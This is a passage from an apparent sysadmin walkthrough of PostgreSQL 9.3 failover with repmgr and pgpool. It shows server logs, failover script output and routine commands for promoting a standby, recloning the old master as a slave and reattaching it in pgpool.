user=,db= LOG: checkpoint complete: wrote 1 buffers (0.0%); 0 transaction log file(s) added, 0 removed, 0 recycled; write=0.002 s, sync=0.002 s, total=0.479 s; sync files=1, longest=0.002 s, average=0.002 s 2014-10-23 14:43:10 CEST [18263]: [30-1] user=,db= LOG: database system is shut down 2014-10-23 14:43:11 CEST [18438]: [3-1] user=repmgr,db=[unknown] LOG: disconnection: session time: 0:48:37.268 user=repmgr database= host=10.32.243.148 port=50909 psql02 (slave db) logs right after the master was stopped cz01-psql02 / # cat /var/lib/pgsql/9.3/data/pg_log/postgresql-Thu.log ... 2014-10-23 14:43:11 CEST [18031]: [2-1] user=,db= LOG: replication terminated by primary server 2014-10-23 14:43:11 CEST [18031]: [3-1] user=,db= DETAIL: End of WAL reached on timeline 1 at 0/61000090. 2014-10-23 14:43:11 CEST [18031]: [4-1] user=,db= FATAL: could not send end-of-streaming message to primary: no COPY in progress 2014-10-23 14:43:11 CEST [18030]: [5-1] user=,db= LOG: record with zero length at 0/61000090 2014-10-23 14:43:11 CEST [24120]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.157 port=52991 2014-10-23 14:43:11 CEST [24120]: [2-1] user=admin,db=postgres LOG: connection authorized: user=admin database=postgres 2014-10-23 14:43:11 CEST [24120]: [3-1] user=admin,db=postgres LOG: disconnection: session time: 0:00:00.010 user=admin database=postgres host=10.32.243.157 port=52991 2014-10-23 14:43:13 CEST [24121]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.158 port=53841 2014-10-23 14:43:13 CEST [24121]: [2-1] user=admin,db=postgres LOG: connection authorized: user=admin database=postgres 2014-10-23 14:43:13 CEST [24121]: [3-1] user=admin,db=postgres LOG: disconnection: session time: 0:00:00.009 user=admin database=postgres host=10.32.243.158 port=53841 2014-10-23 14:43:13 CEST [23435]: [9-1] user=admin,db=postgres LOG: disconnection: session time: 0:03:11.742 user=admin database=postgres host=10.32.243.157 port=52915 2014-10-23 14:43:13 CEST [23438]: [5-1] user=admin,db=postgres LOG: disconnection: session time: 0:03:04.381 user=admin database=postgres host=10.32.243.157 port=52917 2014-10-23 14:43:13 CEST [24129]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.148 port=54332 2014-10-23 14:43:13 CEST [24129]: [2-1] user=repmgr,db=repmgr LOG: connection authorized: user=repmgr database=repmgr 2014-10-23 14:43:13 CEST [24129]: [3-1] user=repmgr,db=repmgr LOG: statement: WITH pg_version(ver) AS (SELECT split_part(version(), ' ', 2)) SELECT split_part(ver, '.', 1), split_part(ver, '.', 2) FROM pg_version 2014-10-23 14:43:13 CEST [24129]: [4-1] user=repmgr,db=repmgr LOG: duration: 2.850 ms 2014-10-23 14:43:13 CEST [24129]: [5-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_is_in_recovery() 2014-10-23 14:43:13 CEST [24129]: [6-1] user=repmgr,db=repmgr LOG: duration: 0.339 ms 2014-10-23 14:43:13 CEST [24129]: [7-1] user=repmgr,db=repmgr LOG: statement: SELECT id, conninfo FROM \"repmgr_pgsql_cluster\".repl_nodes WHERE cluster = 'pgsql_cluster' and not witness 2014-10-23 14:43:13 CEST [24129]: [8-1] user=repmgr,db=repmgr LOG: duration: 2.634 ms 2014-10-23 14:43:13 CEST [24130]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.148 port=54334 2014-10-23 14:43:13 CEST [24130]: [2-1] user=repmgr,db=repmgr LOG: connection authorized: user=repmgr database=repmgr 2014-10-23 14:43:13 CEST [24130]: [3-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_is_in_recovery() 2014-10-23 14:43:13 CEST [24130]: [4-1] user=repmgr,db=repmgr LOG: duration: 1.347 ms 2014-10-23 14:43:13 CEST [24129]: [9-1] user=repmgr,db=repmgr LOG: statement: SELECT setting FROM pg_settings WHERE name = 'data_directory' 2014-10-23 14:43:13 CEST [24130]: [5-1] user=repmgr,db=repmgr LOG: disconnection: session time: 0:00:00.024 user=repmgr database=repmgr host=10.32.243.148 port=54334 2014-10-23 14:43:13 CEST [24129]: [10-1] user=repmgr,db=repmgr LOG: duration: 4.954 ms 2014-10-23 14:43:13 CEST [24129]: [11-1] user=repmgr,db=repmgr LOG: disconnection: session time: 0:00:00.067 user=repmgr database=repmgr host=10.32.243.148 port=54332 2014-10-23 14:43:13 CEST [18021]: [6-1] user=,db= LOG: received fast shutdown request 2014-10-23 14:43:13 CEST [18021]: [7-1] user=,db= LOG: aborting any active transactions 2014-10-23 14:43:13 CEST [18032]: [28-1] user=,db= LOG: shutting down 2014-10-23 14:43:13 CEST [18032]: [29-1] user=,db= LOG: restartpoint starting: shutdown immediate 2014-10-23 14:43:13 CEST [18032]: [30-1] user=,db= LOG: restartpoint complete: wrote 6 buffers (0.0%); 0 transaction log file(s) added, 0 removed, 0 recycled; write=0.002 s, sync=0.002 s, total=0.008 s; sync files=6, longest=0.000 s, average=0.000 s 2014-10-23 14:43:13 CEST [18032]: [31-1] user=,db= LOG: recovery restart point at 0/61000028 2014-10-23 14:43:13 CEST [18032]: [32-1] user=,db= DETAIL: last completed transaction was at log time 2014-10-23 14:40:08.829957+02 2014-10-23 14:43:13 CEST [18032]: [33-1] user=,db= LOG: database system is shut down 2014-10-23 14:43:14 CEST [24141]: [1-1] user=,db= LOG: database system was shut down in recovery at 2014-10-23 14:43:13 CEST 2014-10-23 14:43:14 CEST [24141]: [2-1] user=,db= LOG: database system was not properly shut down; automatic recovery in progress 2014-10-23 14:43:14 CEST [24141]: [3-1] user=,db= LOG: consistent recovery state reached at 0/61000090 2014-10-23 14:43:14 CEST [24141]: [4-1] user=,db= LOG: record with zero length at 0/61000090 2014-10-23 14:43:14 CEST [24141]: [5-1] user=,db= LOG: redo is not required 2014-10-23 14:43:14 CEST [24141]: [6-1] user=,db= LOG: checkpoint starting: end-of-recovery immediate 2014-10-23 14:43:14 CEST [24141]: [7-1] user=,db= LOG: checkpoint complete: wrote 0 buffers (0.0%); 0 transaction log file(s) added, 0 removed, 0 recycled; write=0.002 s, sync=0.000 s, total=0.005 s; sync files=0, longest=0.000 s, average=0.000 s 2014-10-23 14:43:14 CEST [24145]: [1-1] user=,db= LOG: autovacuum launcher started 2014-10-23 14:43:14 CEST [24133]: [5-1] user=,db= LOG: database system is ready to accept connections 2014-10-23 14:43:15 CEST [24148]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=[local] 2014-10-23 14:43:15 CEST [24148]: [2-1] user=postgres,db=postgres LOG: connection authorized: user=postgres database=postgres 2014-10-23 14:43:15 CEST [24148]: [3-1] user=postgres,db=postgres LOG: disconnection: session time: 0:00:00.019 user=postgres database=postgres host=[local] 2014-10-23 14:43:15 CEST [24149]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.148 port=54335 2014-10-23 14:43:15 CEST [24149]: [2-1] user=repmgr,db=repmgr LOG: connection authorized: user=repmgr database=repmgr 2014-10-23 14:43:15 CEST [24149]: [3-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_is_in_recovery() 2014-10-23 14:43:15 CEST [24149]: [4-1] user=repmgr,db=repmgr LOG: duration: 2.252 ms 2014-10-23 14:43:15 CEST [24149]: [5-1] user=repmgr,db=repmgr LOG: disconnection: session time: 0:00:00.030 user=repmgr database=repmgr host=10.32.243.148 port=54335 failover_stream.sh output log from primary pgpool cz01-pgpool01 / # cat /tmp/failover_stream.sh.log Thu Oct 23 14:43:13 CEST 2014 Failed node: 0 + /usr/bin/ssh -T -l postgres cz01-psql02.example.com '/usr/pgsql-9.3/bin/repmgr -f /var/lib/pgsql/repmgr/repmgr.conf standby promote 2&gt;/dev/null 1&gt;/dev/null Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. + exit 0 Check the cluster status after master failure cz01-pgpool02 ~ # ssh postgres@cz01-psql02.example.com \"/usr/pgsql-9.3/bin/repmgr --verbose -f /var/lib/pgsql/repmgr/repmgr.conf cluster show\" Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. [2014-10-23 14:49:07] [INFO] repmgr connecting to database [2014-10-23 14:49:07] [ERROR] Connection to database failed: could not connect to server: Connection refused Is the server running on host \"cz01-psql01.example.com\" (10.32.243.147) and accepting TCP/IP connections on port 5432? Opening configuration file: /var/lib/pgsql/repmgr/repmgr.conf Role | Connection String FAILED | host=cz01-psql01.example.com user=repmgr dbname=repmgr * master | host=cz01-psql02.example.com user=repmgr dbname=repmgr cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 0 cz01-psql01.example.com 5432 3 0.500000 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 1 cz01-psql02.example.com 5432 1 0.500000 Check if everything is working cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -c \"drop database mydb\" DROP DATABASE cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -l | grep mydb cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql02.example.com -w -l | grep mydb Make the “old master” to be a “new slave” cz01-psql01 cz01-pgpool02 ~ # ssh cz01-psql01.example.com 'service postgresql-9.3 stop; su - postgres -c \"repmgr -D /var/lib/pgsql/9.3/data -d repmgr -p 5432 -U repmgr -R postgres --verbose --force standby clone cz01-psql02.example.com\"; service postgresql-9.3 start;' Warning: Permanently added 'cz01-psql01.example.com,10.32.243.147' (RSA) to the list of known hosts. Stopping postgresql-9.3 service: [ OK ] [2014-10-23 14:52:08] [ERROR] Did not find the configuration file './repmgr.conf', continuing [2014-10-23 14:52:08] [NOTICE] repmgr Destination directory /var/lib/pgsql/9.3/data provided, try to clone everything in it. [2014-10-23 14:52:08] [INFO] repmgr connecting to master database [2014-10-23 14:52:08] [INFO] repmgr connected to master, checking its state [2014-10-23 14:52:09] [INFO] Successfully connected to primary. Current installation size is 188 MB Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. [2014-10-23 14:52:09] [NOTICE] Starting backup... [2014-10-23 14:52:09] [WARNING] directory \"/var/lib/pgsql/9.3/data\" exists but is not empty [2014-10-23 14:52:09] [INFO] standby clone: master control file '/var/lib/pgsql/9.3/data/global/pg_control' [2014-10-23 14:52:09] [INFO] standby clone: master control file '/var/lib/pgsql/9.3/data/global/pg_control' [2014-10-23 14:52:09] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql02.example.com:/var/lib/pgsql/9.3/data/global/pg_control /var/lib/pgsql/9.3/data/global' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. receiving incremental file list pg_control 8192 100% 7.81MB/s 0:00:00 (xfer#1, to-check=0/1) sent 102 bytes received 236 bytes 676.00 bytes/sec total size is 8192 speedup is 24.24 [2014-10-23 14:52:09] [INFO] standby clone: master data directory '/var/lib/pgsql/9.3/data' [2014-10-23 14:52:09] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete --exclude=pg_xlog* --exclude=pg_log* --exclude=pg_control --exclude=*.pid postgres@cz01-psql02.example.com:/var/lib/pgsql/9.3/data/* /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. receiving incremental file list deleting base/16528/pg_filenode.map deleting base/16528/PG_VERSION deleting base/16528/12890 deleting base/16528/12888 ... ... ... pg_stat_tmp/db_16413.stat 6089 100% 849.47kB/s 0:00:00 (xfer#16, to-check=2/1542) pg_stat_tmp/global.stat 1026 100% 125.24kB/s 0:00:00 (xfer#17, to-check=1/1542) sent 3810 bytes received 94096 bytes 39162.40 bytes/sec total size is 198017139 speedup is 2022.52 [2014-10-23 14:52:11] [INFO] standby clone: master config file '/var/lib/pgsql/9.3/data/postgresql.conf' [2014-10-23 14:52:11] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql02.example.com:/var/lib/pgsql/9.3/data/postgresql.conf /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. receiving incremental file list sent 11 bytes received 80 bytes 60.67 bytes/sec total size is 20561 speedup is 225.95 [2014-10-23 14:52:12] [INFO] standby clone: master hba file '/var/lib/pgsql/9.3/data/pg_hba.conf' [2014-10-23 14:52:12] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql02.example.com:/var/lib/pgsql/9.3/data/pg_hba.conf /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. receiving incremental file list sent 11 bytes received 76 bytes 174.00 bytes/sec total size is 4812 speedup is 55.31 [2014-10-23 14:52:12] [INFO] standby clone: master ident file '/var/lib/pgsql/9.3/data/pg_ident.conf' [2014-10-23 14:52:12] [INFO] rsync command line: 'rsync --archive --checksum --compress --progress --rsh=ssh --delete postgres@cz01-psql02.example.com:/var/lib/pgsql/9.3/data/pg_ident.conf /var/lib/pgsql/9.3/data' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. receiving incremental file list sent 11 bytes received 78 bytes 178.00 bytes/sec total size is 1636 speedup is 18.38 [2014-10-23 14:52:12] [NOTICE] Finishing backup... NOTICE: pg_stop_backup complete, all required WAL segments have been archived [2014-10-23 14:52:13] [INFO] repmgr requires primary to keep WAL files 000000010000000000000062 until at least 000000010000000000000062 [2014-10-23 14:52:13] [NOTICE] repmgr standby clone complete [2014-10-23 14:52:13] [NOTICE] HINT: You can now start your postgresql server [2014-10-23 14:52:13] [NOTICE] for example : pg_ctl -D /var/lib/pgsql/9.3/data start Opening configuration file: ./repmgr.conf Starting postgresql-9.3 service: [ OK ] Once the slave has been promoted to master, the DB administrator should check exactly what happened to the failed master database. Once the problem has been analyzed, the administrator should not simply restart the “failed” database but instead reconfigure it as a slave. There is currently a master DB; therefore, every other database needs to be a slave. The command above sets up a new slave with data replication from the running master. Pgpool also needs to be notified that the “new” slave is up and running and ready for read-only queries (the commands will follow). The diagram below shows the current status, and the red color indicates the additional changes. Logs right after the new slave cz01-psql01 was configured+started cz01-psql01 / # cat /var/lib/pgsql/9.3/data/pg_log/postgresql-Thu.log ... 2014-10-23 14:52:14 CEST [26707]: [1-1] user=,db= LOG: database system was interrupted; last known up at 2014-10-23 14:52:09 CEST 2014-10-23 14:52:14 CEST [26707]: [2-1] user=,db= LOG: entering standby mode 2014-10-23 14:52:14 CEST [26708]: [1-1] user=,db= LOG: started streaming WAL from primary at 0/62000000 on timeline 1 2014-10-23 14:52:14 CEST [26707]: [3-1] user=,db= LOG: redo starts at 0/62000028 2014-10-23 14:52:14 CEST [26707]: [4-1] user=,db= LOG: consistent recovery state reached at 0/620000F0 2014-10-23 14:52:14 CEST [26698]: [5-1] user=,db= LOG: database system is ready to accept read only connections Logs from cz01-psql02 after the new slave was configured cz01-psql02 / # cat /var/lib/pgsql/9.3/data/pg_log/postgresql-Thu.log ... 2014-10-23 14:52:08 CEST [25481]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.147 port=52477 2014-10-23 14:52:08 CEST [25481]: [2-1] user=repmgr,db=repmgr LOG: connection authorized: user=repmgr database=repmgr 2014-10-23 14:52:08 CEST [25481]: [3-1] user=repmgr,db=repmgr LOG: statement: WITH pg_version(ver) AS (SELECT split_part(version(), ' ', 2)) SELECT split_part(ver, '.', 1), split_part(ver, '.', 2) FROM pg_version 2014-10-23 14:52:08 CEST [25481]: [4-1] user=repmgr,db=repmgr LOG: duration: 2.790 ms 2014-10-23 14:52:08 CEST [25481]: [5-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_is_in_recovery() 2014-10-23 14:52:08 CEST [25481]: [6-1] user=repmgr,db=repmgr LOG: duration: 0.451 ms 2014-10-23 14:52:08 CEST [25481]: [7-1] user=repmgr,db=repmgr LOG: statement: SELECT true FROM pg_settings WHERE name = 'wal_level' AND setting = 'hot_standby' 2014-10-23 14:52:09 CEST [25481]: [8-1] user=repmgr,db=repmgr LOG: duration: 7.175 ms 2014-10-23 14:52:09 CEST [25481]: [9-1] user=repmgr,db=repmgr LOG: statement: SELECT true FROM pg_settings WHERE name = 'wal_keep_segments' AND setting::integer &gt;= '5000'::integer 2014-10-23 14:52:09 CEST [25481]: [10-1] user=repmgr,db=repmgr LOG: duration: 3.971 ms 2014-10-23 14:52:09 CEST [25481]: [11-1] user=repmgr,db=repmgr LOG: statement: SELECT true FROM pg_settings WHERE name = 'archive_mode' AND setting = 'on' 2014-10-23 14:52:09 CEST [25481]: [12-1] user=repmgr,db=repmgr LOG: duration: 3.191 ms 2014-10-23 14:52:09 CEST [25481]: [13-1] user=repmgr,db=repmgr LOG: statement: SELECT true FROM pg_settings WHERE name = 'hot_standby' AND setting = 'on' 2014-10-23 14:52:09 CEST [25481]: [14-1] user=repmgr,db=repmgr LOG: duration: 3.147 ms 2014-10-23 14:52:09 CEST [25481]: [15-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_tablespace_location(oid) spclocation FROM pg_tablespace WHERE spcname NOT IN ('pg_default', 'pg_global') 2014-10-23 14:52:09 CEST [25481]: [16-1] user=repmgr,db=repmgr LOG: duration: 2.541 ms 2014-10-23 14:52:09 CEST [25481]: [17-1] user=repmgr,db=repmgr LOG: statement: SELECT name, setting FROM pg_settings WHERE name IN ('data_directory', 'config_file', 'hba_file', 'ident_file', 'stats_temp_directory') 2014-10-23 14:52:09 CEST [25481]: [18-1] user=repmgr,db=repmgr LOG: duration: 3.842 ms 2014-10-23 14:52:09 CEST [25481]: [19-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_size_pretty(SUM(pg_database_size(oid))::bigint) FROM pg_database 2014-10-23 14:52:09 CEST [25481]: [20-1] user=repmgr,db=repmgr LOG: duration: 16.913 ms 2014-10-23 14:52:09 CEST [25481]: [21-1] user=repmgr,db=repmgr LOG: statement: SET synchronous_commit TO OFF 2014-10-23 14:52:09 CEST [25481]: [22-1] user=repmgr,db=repmgr LOG: duration: 0.282 ms 2014-10-23 14:52:09 CEST [25481]: [23-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_xlogfile_name(pg_start_backup('repmgr_standby_clone_1414068729')) 2014-10-23 14:52:09 CEST [24142]: [3-1] user=,db= LOG: checkpoint starting: force wait 2014-10-23 14:52:09 CEST [25489]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.158 port=53963 2014-10-23 14:52:09 CEST [25489]: [2-1] user=admin,db=postgres LOG: connection authorized: user=admin database=postgres 2014-10-23 14:52:09 CEST [25489]: [3-1] user=admin,db=postgres LOG: disconnection: session time: 0:00:00.008 user=admin database=postgres host=10.32.243.158 port=53963 2014-10-23 14:52:09 CEST [25490]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.157 port=53120 2014-10-23 14:52:09 CEST [25490]: [2-1] user=admin,db=template1 LOG: connection authorized: user=admin database=template1 2014-10-23 14:52:09 CEST [25490]: [3-1] user=admin,db=template1 LOG: disconnection: session time: 0:00:00.008 user=admin database=template1 host=10.32.243.157 port=53120 2014-10-23 14:52:09 CEST [24142]: [4-1] user=,db= LOG: checkpoint complete: wrote 1 buffers (0.0%); 0 transaction log file(s) added, 0 removed, 0 recycled; write=0.002 s, sync=0.000 s, total=0.391 s; sync files=1, longest=0.000 s, average=0.000 s 2014-10-23 14:52:09 CEST [25481]: [24-1] user=repmgr,db=repmgr LOG: duration: 403.777 ms 2014-10-23 14:52:11 CEST [25481]: [25-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_tablespace_location(oid) spclocation FROM pg_tablespace WHERE spcname NOT IN ('pg_default', 'pg_global') 2014-10-23 14:52:11 CEST [25481]: [26-1] user=repmgr,db=repmgr LOG: duration: 0.514 ms 2014-10-23 14:52:12 CEST [25481]: [27-1] user=repmgr,db=repmgr LOG: statement: SELECT pg_xlogfile_name(pg_stop_backup()) 2014-10-23 14:52:13 CEST [25481]: [28-1] user=repmgr,db=repmgr LOG: duration: 1005.802 ms 2014-10-23 14:52:13 CEST [25481]: [29-1] user=repmgr,db=repmgr LOG: disconnection: session time: 0:00:04.406 user=repmgr database=repmgr host=10.32.243.147 port=52477 2014-10-23 14:52:14 CEST [25524]: [1-1] user=[unknown],db=[unknown] LOG: connection received: host=10.32.243.147 port=52484 2014-10-23 14:52:14 CEST [25524]: [2-1] user=repmgr,db=[unknown] LOG: replication connection authorized: user=repmgr No pgpool changes after the new slave cz01-psql01 was configured+started cz01-pgpool01 / # tail -f /var/log/local0 Check the cluster status after failover cz01-pgpool02 ~ # ssh postgres@cz01-psql02.example.com \"/usr/pgsql-9.3/bin/repmgr --verbose -f /var/lib/pgsql/repmgr/repmgr.conf cluster show\" Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. [2014-10-23 14:58:23] [INFO] repmgr connecting to database Opening configuration file: /var/lib/pgsql/repmgr/repmgr.conf Role | Connection String standby | host=cz01-psql01.example.com user=repmgr dbname=repmgr * master | host=cz01-psql02.example.com user=repmgr dbname=repmgr cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 0 cz01-psql01.example.com 5432 3 0.500000 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 1 cz01-psql02.example.com 5432 1 0.500000 Check if everything is working after reinitialization cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -c \"create database mydb\" CREATE DATABASE cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -l | grep mydb mydb | admin | UTF8 | en_US.UTF-8 | en_US.UTF-8 | cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql01.example.com -w -l | grep mydb mydb | admin | UTF8 | en_US.UTF-8 | en_US.UTF-8 | cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql02.example.com -w -l | grep mydb mydb | admin | UTF8 | en_US.UTF-8 | en_US.UTF-8 | Reinitialize the slave in pgpool to be ready for read only queries cz01-pgpool02 ~ # pcp_detach_node 0 localhost 9898 admin password123 0 cz01-pgpool02 ~ # pcp_attach_node 0 localhost 9898 admin password123 0 Logfile right after the slave was enabled for RO queries cz01-pgpool01 / # cat /var/log/local0 ... 2014-10-23T15:55:38.440946+02:00 cz01-pgpool01 pgpool[23264]: send_failback_request: fail back 0 th node request from pid 23264 2014-10-23T15:55:38.442034+02:00 cz01-pgpool01 pgpool[23257]: wd_start_interlock: start interlocking 2014-10-23T15:55:38.455732+02:00 cz01-pgpool01 pgpool[23257]: wd_assume_lock_holder: become a new lock holder 2014-10-23T15:55:38.459908+02:00 cz01-pgpool01 pgpool[23264]: wd_send_response: WD_STAND_FOR_LOCK_HOLDER received but lock holder exists already 2014-10-23T15:55:38.963952+02:00 cz01-pgpool01 pgpool[23257]: starting fail back. reconnect host cz01-psql01.example.com(5432) 2014-10-23T15:55:38.970549+02:00 cz01-pgpool01 pgpool[23257]: Do not restart children because we are failbacking node id 0 hostcz01-psql01.example.com port:5432 and we are in streaming replication mode 2014-10-23T15:55:38.974760+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node_repeatedly: waiting for finding a primary node 2014-10-23T15:55:39.018890+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node: primary node id is 1 2014-10-23T15:55:39.024830+02:00 cz01-pgpool01 pgpool[23257]: wd_end_interlock: end interlocking 2014-10-23T15:55:40.048487+02:00 cz01-pgpool01 pgpool[23257]: failover: set new primary node: 1 2014-10-23T15:55:40.048514+02:00 cz01-pgpool01 pgpool[23257]: failover: set new master node: 0 2014-10-23T15:55:40.048520+02:00 cz01-pgpool01 pgpool[23257]: failback done. reconnect host cz01-psql01.example.com(5432) 2014-10-23T15:55:40.050908+02:00 cz01-pgpool01 pgpool[26165]: worker process received restart request 2014-10-23T15:55:41.051525+02:00 cz01-pgpool01 pgpool[26164]: pcp child process received restart request 2014-10-23T15:55:41.056496+02:00 cz01-pgpool01 pgpool[23257]: PCP child 26164 exits with status 256 in failover() 2014-10-23T15:55:41.056543+02:00 cz01-pgpool01 pgpool[23257]: fork a new PCP child pid 1392 in failover() 2014-10-23T15:55:41.056565+02:00 cz01-pgpool01 pgpool[23257]: worker child 26165 exits with status 256 2014-10-23T15:55:41.057839+02:00 cz01-pgpool01 pgpool[23257]: fork a new worker child pid 1393 Check pgpool status the slave should have a good value now cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 0 cz01-psql01.example.com 5432 1 0.500000 cz01-pgpool02 ~ # pcp_node_info 1 localhost 9898 admin password123 1 cz01-psql02.example.com 5432 1 0.500000 Check if everything is working fine cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -c \"drop database mydb\" DROP DATABASE cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-pgpool-ha.example.com -w -l | grep mydb cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql01.example.com -w -l | grep mydb cz01-pgpool02 ~ # psql --username=admin --dbname=postgres --host cz01-psql02.example.com -w -l | grep mydb Stop the master DB (original slave) - new master should be promoted cz01-pgpool02 ~ # ssh cz01-psql02.example.com 'service postgresql-9.3 stop' Warning: Permanently added 'cz01-psql02.example.com,10.32.243.148' (RSA) to the list of known hosts. Stopping postgresql-9.3 service: [ OK ] Here is another example what may happen if original slave server, promoted to new master fails. Again the slave is automatically promoted by pgpool to the new master and “original master” (later slave) is master again. Changes are using blue color in the diagram below. Logs right after the master (original slave) was stopped cz01-psql02 / # cat /var/lib/pgsql/9.3/data/pg_log/postgresql-Thu.log ... 2014-10-23 16:01:30 CEST [24133]: [6-1] user=,db= LOG: received fast shutdown request 2014-10-23 16:01:30 CEST [24133]: [7-1] user=,db= LOG: aborting any active transactions 2014-10-23 16:01:30 CEST [1991]: [7-1] user=admin,db=postgres FATAL: terminating connection due to administrator command 2014-10-23 16:01:30 CEST [1991]: [8-1] user=admin,db=postgres LOG: disconnection: session time: 0:02:13.805 user=admin database=postgres host=10.32.243.157 port=53988 2014-10-23 16:01:30 CEST [1986]: [7-1] user=admin,db=postgres FATAL: terminating connection due to administrator command 2014-10-23 16:01:30 CEST [1986]: [8-1] user=admin,db=postgres LOG: disconnection: session time: 0:02:19.271 user=admin database=postgres host=10.32.243.157 port=53982 2014-10-23 16:01:30 CEST [24145]: [2-1] user=,db= LOG: autovacuum launcher shutting down 2014-10-23 16:01:30 CEST [24142]: [37-1] user=,db= LOG: shutting down 2014-10-23 16:01:30 CEST [24142]: [38-1] user=,db= LOG: checkpoint starting: shutdown immediate 2014-10-23 16:01:30 CEST [24142]: [39-1] user=,db= LOG: checkpoint complete: wrote 1 buffers (0.0%); 0 transaction log file(s) added, 0 removed, 0 recycled; write=0.002 s, sync=0.008 s, total=0.449 s; sync files=1, longest=0.008 s, average=0.008 s 2014-10-23 16:01:30 CEST [24142]: [40-1] user=,db= LOG: database system is shut down 2014-10-23 16:01:31 CEST [25524]: [3-1] user=repmgr,db=[unknown] LOG: disconnection: session time: 1:09:17.350 user=repmgr database= host=10.32.243.147 port=52484 Logs from pgpool01 after the master was stopped cz01-pgpool01 / # cat /var/log/local0 ... 2014-10-23T16:01:33.199817+02:00 cz01-pgpool01 pgpool[23257]: connect_inet_domain_socket: getsockopt() detected error: Connection refused 2014-10-23T16:01:33.200803+02:00 cz01-pgpool01 pgpool[23257]: make_persistent_db_connection: connection to cz01-psql02.example.com(5432) failed 2014-10-23T16:01:33.200989+02:00 cz01-pgpool01 pgpool[23257]: health check failed. 1 th host cz01-psql02.example.com at port 5432 is down 2014-10-23T16:01:33.201148+02:00 cz01-pgpool01 pgpool[23257]: set 1 th backend down status 2014-10-23T16:01:33.201280+02:00 cz01-pgpool01 pgpool[23257]: wd_start_interlock: start interlocking 2014-10-23T16:01:33.207742+02:00 cz01-pgpool01 pgpool[23264]: wd_send_response: WD_STAND_FOR_LOCK_HOLDER received it 2014-10-23T16:01:33.213943+02:00 cz01-pgpool01 pgpool[23264]: wd_send_response: failover request from other pgpool is canceled because it's while switching 2014-10-23T16:01:33.229107+02:00 cz01-pgpool01 pgpool[1393]: connect_inet_domain_socket: getsockopt() detected error: Connection refused 2014-10-23T16:01:33.229133+02:00 cz01-pgpool01 pgpool[1393]: make_persistent_db_connection: connection to cz01-psql02.example.com(5432) failed 2014-10-23T16:01:33.233566+02:00 cz01-pgpool01 pgpool[1393]: check_replication_time_lag: could not connect to DB node 1, check sr_check_user and sr_check_password 2014-10-23T16:01:33.716568+02:00 cz01-pgpool01 pgpool[23257]: starting degeneration. shutdown host cz01-psql02.example.com(5432) 2014-10-23T16:01:33.716597+02:00 cz01-pgpool01 pgpool[23257]: Restart all children 2014-10-23T16:01:36.720365+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node_repeatedly: waiting for finding a primary node 2014-10-23T16:01:36.735887+02:00 cz01-pgpool01 pgpool[23257]: find_primary_node: primary node id is 0 2014-10-23T16:01:36.736038+02:00 cz01-pgpool01 pgpool[23257]: wd_end_interlock: end interlocking 2014-10-23T16:01:37.243499+02:00 cz01-pgpool01 pgpool[23257]: failover: set new primary node: 0 2014-10-23T16:01:37.243536+02:00 cz01-pgpool01 pgpool[23257]: failover: set new master node: 0 2014-10-23T16:01:37.332464+02:00 cz01-pgpool01 pgpool[1393]: worker process received restart request 2014-10-23T16:01:37.335636+02:00 cz01-pgpool01 pgpool[23257]: failover done. shutdown host cz01-psql02.example.com(5432) 2014-10-23T16:01:38.338656+02:00 cz01-pgpool01 